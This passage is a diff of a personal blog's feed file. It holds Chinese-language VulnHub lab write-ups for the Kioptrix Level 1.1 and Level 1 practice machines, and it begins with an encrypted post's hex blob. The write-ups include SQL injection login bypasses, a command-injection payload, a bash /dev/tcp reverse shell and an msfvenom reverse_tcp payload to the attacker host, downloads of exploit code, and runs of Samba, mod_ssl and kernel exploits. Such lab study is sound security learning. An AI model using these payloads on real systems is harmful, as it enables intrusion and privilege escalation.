5baa89d55f7429004e1169c8e1908685b89efc9eca11451b4012bc9addd3e5c0f33cf04de874a1ada09d82e34f40eb984bcd7530b888af3777b9f1ecf96a94b65f77d686574dcedefac63eb7e966ddc6ac6e97293ca04fe8060386a54264a6a7f78b818e0629c7700fc79ea2db094060731e053bf174ca16c2ea6b6e6f833e562c4e415020e64d8a10c6a082564768bd2fed72c28cbf1547b7c1540e85b003bc436811dfc6f388ace70f40b9d3782355933daf24ca4b3cf140c89c6aab98d0deee361dabfc57ff1c6dac8c9c1d5d1ad15b25422784a0c9c50a91bbc396f84e9450177a2c94c3f93e5ea28f38a1ea48b3faab06802953a03e2fc3950dafc37e0b6dc3f644a564788d5d97d09f56daa1fb4f1f52f5645b8002cae2415704508a93af450cf45ae483debc2ffb11c49ca3c170970e793f31b09cde9ca15c10e5b29b8ea9a04412ad4db8308abcc7d47fb7ed0cd06215e107f4c198a40111afd657d4167b128208c4f4f5fc6840b2d63f6d436a6187f9798299cbfa58daa5f45470f0b23f6b5b72aa6d6516f4bbf0e70eb26c6c17eb7eaac92c0c91698b501ea3762b8d1ed13102f3644b0105fcb5d5c2bbe231bd419d7c4ed64a5e2a2c8f157bafeff9672925a776b1a1a53f161f654fa17f4821e8771733fb68d64f9ef1b59a510e24334191c9cf71cc091863b67cfafe6c78a609db703c4760f2a85ba1748ead74bd0adee0eba8cf59355922a2093883ab0476d578d8362b6e4d19a06ff457a63b82f06db7aa77aa275b33ce70154862f3c6d6eba129d22033fb11ac5db2b3dcc6ca187c9fde32bf9ca324ab5b2254a51d41a0885470bbf5498f429389b173fb24301daf71f862c57a1496ba52678a0e186b9a29f03613f6060d664206054db2e6d51a5446004d487705799779b30ac313fb93614814e86fc436129ef6101101804e2186c8a85cdf4acc5fb9386e09d1fe702367e072447b6aee44f54d386d4a88439979176855860ea5407cd2b355a76738c65869056e428880394d5d17f4f129c4ddb19aab4f9a15695863fc5a489f85b78d32db6e752adecd02feb8b996a13c7af9cbd7b066b2537dd9cc4dee727a18ed2c54e80554ac125b5df007008be37b7442f207adcc9bdc8001abf20f0684b7009cc0b099c6d3e0c99dc012b2a4554f9718798772edfa973c086f365c0b6fc1092298b0a2c81b8eb848a543e4fe521e3af1d1d51324c945f6d4350d2d8aa436aaa05ec4a342b97ed7c9e5c2bc1eb2be34b2f56bd98a01f9d70e4c97ab4d43f0b386c1a7318e8dc465e5e7a45352a60dd41e8f59cceb1eb552def451f27f6e4d71eb353839198cf8c4f3b892e92467b8c4ebdcad42d99acced18771ae1d4e16add0ed2ea026c361818565e5e461d1f4cbea44fd90bf88a2099848e0a5b2343fa4e1e3af5364c8ea5565a84fca9ba5f0c34e531c1cb560b93a1e5c55b0eefb089f4553b3c6f388038bcb4156b354494073509d5f39101bb311cae992b796f173e6529a173ded79d27703ec5deb55b981f36e1556078acac6a0f9f579b28aa5a31ac9b0b76053984a468f093bad15dce44effbadf610239edea7147ffb024abadb601982ea97a46ca520726b7b5bf6b5e0a36b6c9101130233d96eadc541fdd9290536d21516fa0b5b57e8b2bd3b635ba6ecc5043bff372fffd4dc5a1bd0857f3ef9b9cb24d5a8bcc51cf776fe4fca11326622c23b6cec599b59703ee8f9107e6a04bc5b095073ca4e1d571bedacd3b28a6625c1fe0f4e3147cb19345fbb2e48285436bf134fdcaa883e02e301e755bea767fb50c024d316a9c297389efc9b5820ec9c67498cbb0f3507937d2eac7948ef679087bd1486e9bcd94bd0efe2b2d50fa1b34c4a35bf2507c3d1dbe15ce5b0e816a5d27f07f6e3eefdefa7c5ceeed321081f94680778b66302a021093fedca63472fba945bd9708c507685c89ce25afc79</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kioptrix Level 1.1(#2)</title>
+      <link href="/2024/02/03/Kioptrix_Level_1.1/"/>
+      <url>/2024/02/03/Kioptrix_Level_1.1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-112"><a class="markdownIt-Anchor" href="#kioptrix-level-112"></a> Kioptrix Level 1.1(#2)</h1><blockquote><p>参考 <a href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p></blockquote><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3><ul><li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li><li>nmap扫描端口及端口服务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure><p><strong>看到了web服务：80端口和443端口</strong></p><ul><li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>F12 查看源代码</li></ul><img src="/2024/02/03/Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p><h4 id="我的体验"><a class="markdownIt-Anchor" href="#我的体验"></a> 我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p><h3 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h3><h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> Sql注入</h4><ul><li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>' or '1' = '1 </code>（这里的sql注入很简单，很多思路都是可以的）</p></li><li><p>还有一篇walkthrough里面有人是username输入<code>admin' or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p><ul><li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li></ul></li><li><p>成功后看到以下页面：</p></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h4 id="寻找漏洞rce漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞rce漏洞"></a> 寻找漏洞：RCE漏洞</h4><ul><li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p><p><strong>证明确实存在RCE</strong></p><h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4><h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5><blockquote><p>参考 <a href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p></blockquote><h6 id="0x01-bash建立tcp连接"><a class="markdownIt-Anchor" href="#0x01-bash建立tcp连接"></a> 0x01 bash建立tcp连接</h6><ul><li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p></li><li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p><h6 id="0x02-msfvenom生成后门"><a class="markdownIt-Anchor" href="#0x02-msfvenom生成后门"></a> 0x02 msfvenom生成后门</h6><blockquote><p>参考<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p></blockquote><ul><li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure><h3 id="linux-提权-linux-privilege-escalation"><a class="markdownIt-Anchor" href="#linux-提权-linux-privilege-escalation"></a> Linux 提权  Linux Privilege Escalation</h3><blockquote><p>参考 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p></blockquote><h4 id="提权信息收集"><a class="markdownIt-Anchor" href="#提权信息收集"></a> 提权信息收集</h4><ul><li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure><p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>发现Linux版本是CentOS 4.5</strong></p><ul><li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li></ul><blockquote><p>关于工具使用：<a href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客</a></p></blockquote><h4 id="寻找centos-45漏洞利用提权脚本"><a class="markdownIt-Anchor" href="#寻找centos-45漏洞利用提权脚本"></a> 寻找CentOS 4.5漏洞利用提权脚本</h4><ul><li><code>searchsploit CentOS 4.5</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li></ul><h4 id="将脚本传到靶机"><a class="markdownIt-Anchor" href="#将脚本传到靶机"></a> 将脚本传到靶机</h4><h5 id="0x01-python-simplehttpserver-快速共享当前目录"><a class="markdownIt-Anchor" href="#0x01-python-simplehttpserver-快速共享当前目录"></a> 0x01 Python SimpleHTTPServer 快速共享当前目录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure><ul><li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><mark><em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em></mark></p><ul><li>同时在攻击机上也可以看到靶机的信息</li></ul><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h5 id="0x02-service-apache2-start"><a class="markdownIt-Anchor" href="#0x02-service-apache2-start"></a> 0x02 service apache2 start</h5><ul><li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p></li><li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p></li><li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p></li><li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p></li></ul><h4 id="编译运行脚本"><a class="markdownIt-Anchor" href="#编译运行脚本"></a> 编译运行脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure><p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2><blockquote><p>优秀总结：<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p></blockquote><h3 id="关于631端口-ipp服务-cups-11"><a class="markdownIt-Anchor" href="#关于631端口-ipp服务-cups-11"></a> 关于631端口 ipp服务 CUPS 1.1</h3><ul><li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li></ul><h3 id="关于渗透方向"><a class="markdownIt-Anchor" href="#关于渗透方向"></a> 关于渗透方向</h3><ul><li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li></ul><h3 id="关于-linux-提权"><a class="markdownIt-Anchor" href="#关于-linux-提权"></a> 关于 Linux 提权</h3><ul><li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p></li><li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p><ul><li>LinEnum 可以枚举信息</li><li><a href="http://lse.sh">lse.sh</a> 可以枚举一些系统可能存在的漏洞信息</li></ul><p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p></li><li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p></li></ul><h3 id="关于主机间传文件-via-http"><a class="markdownIt-Anchor" href="#关于主机间传文件-via-http"></a> 关于主机间传文件 via http</h3><ul><li>Python建立简单http服务</li><li>在攻击机中开启apache</li></ul><h3 id="关于web渗透sql注入"><a class="markdownIt-Anchor" href="#关于web渗透sql注入"></a> 关于web渗透sql注入</h3><ul><li>sql注入知识（<strong>有待进一步学习</strong>）</li></ul>]]></content>
+      
+      
       <categories>
-        <category>Mad1sun的生活小日记</category>
+          
+          <category> 类OSCP靶机练习 </category>
+          
       </categories>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kioptrix Level 1</title>
+      <link href="/2024/01/29/Kioptrix_Level_1/"/>
+      <url>/2024/01/29/Kioptrix_Level_1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-1"><a class="markdownIt-Anchor" href="#kioptrix-level-1"></a> Kioptrix Level 1</h1><blockquote><p>参考 <a href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com)</a></p></blockquote><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3><ul><li>nmap扫描附近存活主机ip</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure><p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p><ul><li>nmap扫描端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure><p>-sV 列举出端口使用协议或服务的版本信息</p><p>-p- 扫描全端口</p><p>-T4 设置线程数 <code>加快扫描速度</code></p><p><strong>开放端口信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure><h3 id="思路1samba-139端口"><a class="markdownIt-Anchor" href="#思路1samba-139端口"></a> 思路1——Samba 139端口</h3><h4 id="查询samba版本"><a class="markdownIt-Anchor" href="#查询samba版本"></a> 查询Samba版本</h4><ul><li><p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p><ul><li>smbclient -L=<ip></ip></li></ul></li><li><p>这里使用metasploit的Auxiliary模块</p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><mark>注意：oscp中不允许使用msf，这里仅供学习</mark></p><h4 id="寻找exploit"><a class="markdownIt-Anchor" href="#寻找exploit"></a> 寻找exploit</h4><ul><li>工具：<code>searchsploit</code></li><li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>发现存在trans2open Overflow的漏洞</strong></p><ul><li><p>在github中找到了脚本：<a href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c</a></p></li><li><p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p></li></ul><h4 id="编译和运行脚本"><a class="markdownIt-Anchor" href="#编译和运行脚本"></a> 编译和运行脚本</h4><h5 id="github脚本"><a class="markdownIt-Anchor" href="#github脚本"></a> github脚本</h5><ul><li><p>编译：<code>gcc trans2open.c -o trans2open </code></p></li><li><p>运行：<code>./trans2open</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure></li><li><p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h5 id="searchsploit自带脚本"><a class="markdownIt-Anchor" href="#searchsploit自带脚本"></a> searchsploit自带脚本</h5><ul><li><p>编译</p></li><li><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           </span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure></li><li><p>根据提示：<code>./10 -b 0 192.168.89.132</code></p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h3 id="思路2-mod_ssl284-端口443"><a class="markdownIt-Anchor" href="#思路2-mod_ssl284-端口443"></a> 思路2 ——mod_ssl/2.8.4 端口443</h3><h4 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h4><p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><h4 id="寻找exploit-2"><a class="markdownIt-Anchor" href="#寻找exploit-2"></a> 寻找exploit</h4><ul><li><code>searchsploit mod_ssl 2.8.4</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>挑选一个数值更大的文件：47080.c</strong></p><ul><li><code>searchsploit -x unix/remote/47080.c</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>仔细看注释，里面写了requirements和编译命令</strong></p><h4 id="编译和运行脚本-2"><a class="markdownIt-Anchor" href="#编译和运行脚本-2"></a> 编译和运行脚本</h4><p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p><p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p><h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2><h3 id="关于samba"><a class="markdownIt-Anchor" href="#关于samba"></a> 关于Samba</h3><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 